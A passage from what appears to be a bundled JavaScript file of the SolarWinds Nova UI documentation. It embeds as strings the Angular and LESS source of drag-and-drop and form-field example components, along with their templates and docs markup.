"mixins";\n\n@min-height: 50px;\n\n.draggable-container {\n    width: 50%;\n    float: left;\n    min-height: (@min-height * 5);\n\n    .draggable-list {\n        border: solid @dnd-zone-border-width transparent;\n        position: relative;\n        padding: @nui-space-sm;\n        transition: all 0.3s ease-in-out;\n\n        .title {\n            position: absolute;\n        }\n        &.cdk-drop-list-dragging,\n        &.cdk-drop-list-receiving {\n            .draggable-item:hover {\n                box-shadow: none;\n                background-color: initial;\n            }\n        }\n    }\n}\n\n.dragzone {\n    .cdk-drop-list-dragging .draggable-item:not(.cdk-drag-placeholder) {\n        transition: transform 250ms cubic-bezier(0, 0, 0.2, 1);\n    }\n}\n\n.dropzone {\n    margin: 10px 0;\n    min-height: (2 * (@min-height + @nui-space-md + @dnd-zone-border-width));\n\n    .cdk-drag-placeholder,\n    .draggable-placeholder {\n        visibility: hidden;\n        min-height: @min-height - @dnd-zone-border-width;\n    }\n}\n\n.item,\n.draggable-item,\n.draggable-placeholder {\n    min-height: @min-height + @dnd-item-border-width;\n    padding: @nui-space-md;\n    box-sizing: border-box;\n    text-align: center;\n    border: @dnd-item-border-width @nui-color-line-default solid;\n    .transition(box-shadow 0.4s);\n}\n\n.item,\n.draggable-item {\n    border-bottom-color: transparent;\n\n    &.cdk-drag:hover:not(.cdk-drag-placeholder) {\n        .nui-dnd-hover-state();\n        .nui-dnd-raised-state();\n        cursor: move;\n        padding: @nui-space-md;\n    }\n}\n&.items-container :last-child {\n    border-bottom-color: @nui-color-line-default;\n}\n\n.centered-overlay .text-special {\n    top: -25px;\n}\n\n// This class is added to a cdkDrag element when the user has stopped dragging.\n// CDK will animate the element from its drop position to the final position inside the cdkDropList container\n.cdk-drag-animating {\n    transition: transform 250ms cubic-bezier(0, 0, 0.2, 1);\n}\n'},66881:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport {\n    CdkDragDrop,\n    CdkDropList,\n    copyArrayItem,\n} from "@angular/cdk/drag-drop";\nimport { ChangeDetectionStrategy, Component } from "@angular/core";\n\n@Component({\n    selector: "dnd-dropzone",\n    templateUrl: "./dnd-dropzone.example.component.html",\n    styleUrls: ["./dnd-dropzone.example.component.less"],\n    changeDetection: ChangeDetectionStrategy.OnPush,\n})\nexport class DndDropzoneExampleComponent {\n    public sourceItems: string[] = ["Adobe", "IBM"];\n    public destinationItems: string[] = ["Dell"];\n\n    // prevent user from putting back already displaced items\n    public sourceAcceptsItem(item: string, dropList?: CdkDropList): boolean {\n        return false;\n    }\n\n    public destinationAcceptsItem(\n        item: string,\n        dropList?: CdkDropList\n    ): boolean {\n        return item === "Adobe" || item === "Dell";\n    }\n\n    public onItemDropped(event: CdkDragDrop<string[]>): void {\n        if (!this.destinationAcceptsItem(event.item.data)) {\n            return;\n        }\n\n        copyArrayItem(\n            event.previousContainer.data,\n            event.container.data,\n            event.previousIndex,\n            event.currentIndex\n        );\n    }\n}\n'},81665:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { DragDropModule } from "@angular/cdk/drag-drop";\nimport { CdkTreeModule } from "@angular/cdk/tree";\nimport { NgModule } from "@angular/core";\nimport { RouterModule, Routes } from "@angular/router";\n\nimport { NuiDndModule, NuiDocsModule, NuiMessageModule } from "@nova-ui/bits";\n\nimport { DndAxisConstraintsExampleComponent } from "./dnd-axis-constraints/dnd-axis-constraints.example.component";\nimport { DndBasicExampleComponent } from "./dnd-basic/dnd-basic.example.component";\nimport { DndCustomHandleExampleComponent } from "./dnd-custom-handle/dnd-custom-handle.example.component";\nimport { DndDocsExampleComponent } from "./dnd-docs/dnd-docs.example.component";\nimport { DndDragDisabledExampleComponent } from "./dnd-drag-disabled/dnd-drag-disabled-example.component";\nimport { DndDragPlaceholderExampleComponent } from "./dnd-drag-placeholder/dnd-drag-placeholder-example.component";\nimport { DndDragPreviewExampleComponent } from "./dnd-drag-preview/dnd-drag-preview.example.component";\nimport { DndDropzoneExampleComponent } from "./dnd-dropzone/dnd-dropzone.example.component";\nimport { DndDropzoneVisualExampleComponent } from "./dnd-dropzone-visual/dnd-dropzone-visual-example.component";\n\nconst routes: Routes = [\n    {\n        path: "",\n        children: [\n            {\n                path: "",\n                component: DndDocsExampleComponent,\n            },\n            {\n                path: "dropzone",\n                component: DndDropzoneExampleComponent,\n            },\n            {\n                path: "dropzone-visual",\n                component: DndDropzoneExampleComponent,\n            },\n        ],\n    },\n];\n\n@NgModule({\n    declarations: [\n        DndBasicExampleComponent,\n        DndCustomHandleExampleComponent,\n        DndDragDisabledExampleComponent,\n        DndDragPlaceholderExampleComponent,\n        DndDragPreviewExampleComponent,\n        DndDocsExampleComponent,\n        DndDropzoneExampleComponent,\n        DndDropzoneVisualExampleComponent,\n        DndAxisConstraintsExampleComponent,\n    ],\n    imports: [\n        NuiDocsModule,\n        NuiDndModule,\n        NuiMessageModule,\n        RouterModule.forChild(routes),\n        DragDropModule,\n        CdkTreeModule,\n    ],\n})\nexport default class DndModule {}\n'},25547:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { RouterModule, Routes } from "@angular/router";\n\nimport { DEMO_PATH_TOKEN, SrlcStage } from "@nova-ui/bits";\n\nimport { SummaryComponent } from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes: Routes = [\n    {\n        path: "",\n        redirectTo: "summary",\n        pathMatch: "full",\n    },\n    {\n        path: "summary",\n        component: SummaryComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "drag-and-drop",\n        loadChildren: async () => import("./drag-and-drop/dnd.module"),\n        data: {\n            srlc: {\n                stage: SrlcStage.beta,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [RouterModule.forChild(routes)],\n    declarations: [SummaryComponent],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("external-libraries"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class ExternalLibrariesModule {}\n'},52762:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./summary/summary.component";\nexport * from "./drag-and-drop/dnd-docs/dnd-docs.example.component";\nexport * from "./drag-and-drop/dnd-basic/dnd-basic.example.component";\nexport * from "./drag-and-drop/dnd-custom-handle/dnd-custom-handle.example.component";\n'},89844:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h1>External Libraries</h1>\n<p>\n    External front-end libraries can be used to enhance your app\'s\n    functionality. The following section lists some of the available libraries\n    you can use. Follow the links for examples on how to use them in your app.\n</p>\n<ol>\n    <li>\n        <a href="#/external-libraries/drag-and-drop">Drag & Drop</a>\n    </li>\n</ol>\n'},42260:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-external-libraries-summary",\n    templateUrl: "./summary.component.html",\n})\nexport class SummaryComponent {}\n'},87427:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-form-field\n    class="d-block mb-4"\n    caption="Form field with string hint"\n    i18n-caption\n    info="Some info to show"\n    i18n-info\n    hint="Hint may be useful Some pretty long text with hint."\n>\n    <nui-textbox></nui-textbox>\n</nui-form-field>\n<nui-form-field\n    caption="Form field with hint template"\n    i18n-caption\n    info="Some info to show"\n    i18n-info\n    [hintTemplate]="hintTemplate"\n>\n    <nui-textbox></nui-textbox>\n</nui-form-field>\n<ng-template #hintTemplate>\n    <ng-container i18n\n        >Some pretty long text with hint.\n        <a href="" [routerLink]="[]">Example link.</a></ng-container\n    >\n</ng-template>\n'},33755:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-form-field-hint-basic-example",\n    templateUrl: "./form-field-hint.example.component.html",\n})\nexport class FormFieldBasicHintExampleComponent {}\n'},88532:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<form [formGroup]="reactiveForm">\n    <nui-form-field\n        i18n-caption\n        caption="Email address"\n        i18n-hint\n        hint="Try to change value or remove everything"\n        [control]="reactiveForm.controls[\'email\']"\n    >\n        <nui-textbox formControlName="email" type="email"></nui-textbox>\n\n        <nui-custom-validation-message for="required">\n            <div class="nui-validation-message" role="alert">\n                <nui-icon\n                    icon="status_critical"\n                    iconSize="small"\n                    aria-hidden="true"\n                ></nui-icon>\n                <span class="ml-1"><em i18n>This is required</em></span>\n            </div>\n        </nui-custom-validation-message>\n\n        <nui-custom-validation-message for="email">\n            <div class="nui-validation-message" role="alert">\n                <nui-icon\n                    icon="status_critical"\n                    iconSize="small"\n                    aria-hidden="true"\n                ></nui-icon>\n                <span class="ml-1"\n                    ><em i18n>This should be a valid email</em></span\n                >\n            </div>\n        </nui-custom-validation-message>\n    </nui-form-field>\n</form>\n'},82420:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { FormBuilder, Validators } from "@angular/forms";\n\n@Component({\n    selector: "nui-form-field-basic-reactive-custom-validation-example",\n    templateUrl:\n        "./basic-reactive-form-field-custom-validation.example.component.html",\n})\nexport class FormFieldBasicReactiveCustomValidationExampleComponent {\n    public reactiveForm;\n\n    constructor(private formBuilder: FormBuilder) {\n        this.reactiveForm = this.formBuilder.group({\n            email: this.formBuilder.control("", [\n                Validators.required,\n                Validators.email,\n            ]),\n        });\n    }\n}\n'},39216:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<form [formGroup]="reactiveForm">\n    <nui-form-field\n        caption="Email address"\n        i18n-caption\n        hint="Try to change value or remove everything"\n        i18n-hint\n        [control]="reactiveForm.controls[\'email\']"\n    >\n        <nui-textbox formControlName="email" type="email"></nui-textbox>\n        <nui-validation-message for="required" i18n>\n            This is required\n        </nui-validation-message>\n        <nui-validation-message for="email" i18n>\n            This should be a valid email\n        </nui-validation-message>\n    </nui-form-field>\n</form>\n'},94544:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { UntypedFormBuilder, Validators } from "@angular/forms";\n\n@Component({\n    selector: "nui-form-field-basic-reactive-example",\n    templateUrl: "./basic-reactive-form-field.example.component.html",\n})\nexport class FormFieldBasicReactiveExampleComponent {\n    public reactiveForm;\n\n    constructor(private formBuilder: UntypedFormBuilder) {\n        this.reactiveForm = this.formBuilder.group({\n            email: this.formBuilder.control("", [\n                Validators.required,\n                Validators.email,\n            ]),\n        });\n    }\n}\n'},29918:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-form-field\n    caption="This caption is generic for all form fields"\n    i18n-caption\n    info="Some info to show"\n    i18n-info\n    hint="Hint may be useful"\n    i18n-hint\n>\n    <nui-textbox></nui-textbox>\n</nui-form-field>\n'},74810:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-form-field-basic-example",\n    templateUrl: "./basic-form-field.example.component.html",\n})\nexport class FormFieldBasicExampleComponent {}\n'},16160:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<form [formGroup]="fancyForm" class="nui-edge-definer">\n    <nui-form-field\n        class="d-block mb-4"\n        caption="Password"\n        i18n-caption\n        hint="Some pretty long text with hint"\n        i18n-hint\n        info="text"\n        [control]="fancyForm.controls.password"\n    >\n        <nui-textbox formControlName="password"></nui-textbox>\n        <nui-validation-message for="required" i18n>\n            This is required\n        </nui-validation-message>\n    </nui-form-field>\n    <nui-form-field\n        class="d-block mb-4"\n        caption="Confirm Password"\n        i18n-caption\n        hint="Some pretty long text with hint"\n        i18n-hint\n        info="text"\n        [control]="fancyForm.controls.confirmPassword"\n    >\n        <nui-textbox formControlName="confirmPassword"></nui-textbox>\n        <nui-validation-message for="required" i18n>\n            This is required\n        </nui-validation-message>\n    </nui-form-field>\n</form>\n<pre>fancyForm.valid = {{ fancyForm.valid }}</pre>\n'},83904:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ChangeDetectorRef, Component } from "@angular/core";\nimport { AbstractControl, FormBuilder, Validators } from "@angular/forms";\n\n@Component({\n    selector: "nui-form-field-complex-example",\n    templateUrl: "./form-field-complex.example.component.html",\n})\nexport class FormFieldComplexExampleComponent {\n    static matchPassword(group: AbstractControl): { isValid: boolean } | null {\n        const password = group.get("password");\n        const confirm = group.get("confirmPassword");\n        if (!password || !confirm) {\n            return null;\n        }\n\n        if (password.pristine || confirm.pristine) {\n            return null;\n        }\n\n        group.markAsTouched();\n\n        if (password.value === confirm.value) {\n            return null;\n        }\n\n        return {\n            isValid: false,\n        };\n    }\n\n    public fancyForm;\n\n    constructor(\n        private formBuilder: FormBuilder,\n        private changeDetector: ChangeDetectorRef\n    ) {\n        this.fancyForm = this.formBuilder.group(\n            {\n                password: this.formBuilder.control("", Validators.required),\n                confirmPassword: this.formBuilder.control(\n                    "",\n                    Validators.required\n                ),\n            },\n            {\n                validators: [FormFieldComplexExampleComponent.matchPassword],\n            }\n        );\n    }\n}\n'},24526:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<form [formGroup]="dynamicForm">\n    <nui-form-field\n        class="d-block mb-4"\n        caption="Password"\n        i18n-caption\n        [control]="dynamicForm.controls[\'password\']"\n        id="nui-form-field-dynamic-disabling"\n    >\n        <nui-textbox\n            id="nui-form-field-dynamic-disabling-password"\n            formControlName="password"\n            (textChange)="onPasswordBlurred()"\n        ></nui-textbox>\n        <nui-validation-message for="required" i18n>\n            This is required\n        </nui-validation-message>\n    </nui-form-field>\n    <nui-form-field\n        caption="Confirm Password"\n        i18n-caption\n        [control]="dynamicForm.controls[\'confirmPassword\']"\n    >\n        <nui-textbox\n            id="nui-form-field-dynamic-disabling-confirm-password"\n            formControlName="confirmPassword"\n        ></nui-textbox>\n        <nui-validation-message for="required" i18n>\n            This is required\n        </nui-validation-message>\n    </nui-form-field>\n</form>\n'},14698:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject } from "@angular/core";\nimport { FormBuilder, Validators } from "@angular/forms";\n\nimport { ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-form-field-dynamic-disabling-example",\n    templateUrl: "./form-field-dynamic-disabling.example.component.html",\n})\nexport class FormFieldDynamicDisablingExampleComponent {\n    public dynamicForm;\n    public visibleRadio: boolean;\n\n    constructor(\n        private formBuilder: FormBuilder,\n        @Inject(ToastService) private toastService: ToastService\n    ) {\n        this.dynamicForm = this.formBuilder.group({\n            password: this.formBuilder.control("", Validators.required),\n            confirmPassword: this.formBuilder.control(\n                { value: "", disabled: true },\n                Validators.required\n            ),\n        });\n    }\n\n    public onPasswordBlurred(): void {\n        if (this.dynamicForm.controls.password.valid) {\n            this.dynamicForm.controls.confirmPassword.enable();\n        } else {\n            this.dynamicForm.controls.confirmPassword.disable();\n        }\n    }\n\n    public toggleRadio(): void {\n        this.visibleRadio = !this.visibleRadio;\n    }\n}\n'},12430:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiFormFieldModule</code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n\n<p>\n    Form Field is a convenient wrapper that helps to combine your inputs in a\n    form. Currently we support these types of form items (but please note that\n    not all of these components are in alpha stage):\n</p>\n<ul>\n    <li>textbox</li>\n    <li>textarea</li>\n    <li>textNumber</li>\n    <li>checkbox</li>\n    <li>checkboxGroup</li>\n    <li>combobox</li>\n    <li>radioGroup</li>\n    <li>switch</li>\n    <li>select</li>\n    <li>datePicker</li>\n    <li>timePicker</li>\n    \x3c!--<li>dateTimePicker</li>--\x3e\n    \x3c!--<li>timeFramePicker</li>--\x3e\n</ul>\n\n<p>\n    <code>nui-form-field</code> is a building block for any form. It gives an\n    ability to add label for any input, complementary help text under it and\n    info icon with a popover to display some additional text.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="basic-form-field"\n    exampleTitle="Basic Form Field"\n>\n    <nui-form-field-basic-example></nui-form-field-basic-example>\n</nui-example-wrapper>\n\n<h2>Validation Messages Inside Reactive Form</h2>\n<p>\n    In order to use <code>nui-form-field</code> within reactive form you need to\n    pass it access to a control\n    <code>[control]="reactiveForm.controls[\'email\']"</code>. Also\n    <code>formControlName</code> needs to be set directly on the input element\n    you\'re using with the name of a form control.\n</p>\n<p>\n    <code>nui-validation-message</code> component can be added inside\n    <code>nui-form-field</code>. It has 2 inputs: <code>show</code> and\n    <code>for</code>. Form Field Component will change <code>show</code> by\n    itself to control visibility of the error message (this input is useful for\n    consumers only outside <code>nui-form-field</code>), <code>for</code> input\n    accepts validator name.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="basic-reactive-form-field"\n    exampleTitle="Validation Messages Inside Reactive Form"\n>\n    <nui-form-field-basic-reactive-example></nui-form-field-basic-reactive-example>\n</nui-example-wrapper>\n\n<p>\n    For customization purposes, we provide the\n    <code>nui-custom-validation-message</code>\n    component that does not contain internal styling and html elements.\n    <b>Input properties are similar to 